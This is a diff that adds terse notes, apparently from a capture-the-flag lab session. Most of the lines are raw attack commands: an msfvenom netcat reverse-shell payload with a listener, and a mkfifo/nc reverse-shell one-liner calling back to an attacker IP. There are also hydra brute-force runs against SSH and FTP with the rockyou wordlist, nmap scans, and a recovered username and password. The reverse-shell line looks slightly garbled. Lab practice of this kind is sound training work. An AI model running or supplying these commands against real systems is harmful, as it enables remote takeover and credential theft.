@@ -1,0 +1,28 @@
+msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
+
+nc -lvp 4444
+
+.RUN mkfifo /tmp/sskzp; nc 10.11.36.171 4444 0tmp/sskzp | /bin/sh >/tmp/sskzp 2>&1; rm /tmp/sskzp
+ (AttackBox IP)
+
+10.10.40.85
+
+/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
+
+hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.17.191 ssh
+
+10.10.11.80
+
+nmap -sC -sV -p- -T4 --min-rate=9326 -vv [MACHINE IP]
+
+echo eddie >users.txt
+
+echo quinn >users.txt
+
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -vV ftp://10.10.11.80:10021
+
+u:quinn p:andrea
+
+http://10.10.11.80:8080
+
+nmap -sN 10.10.11.80
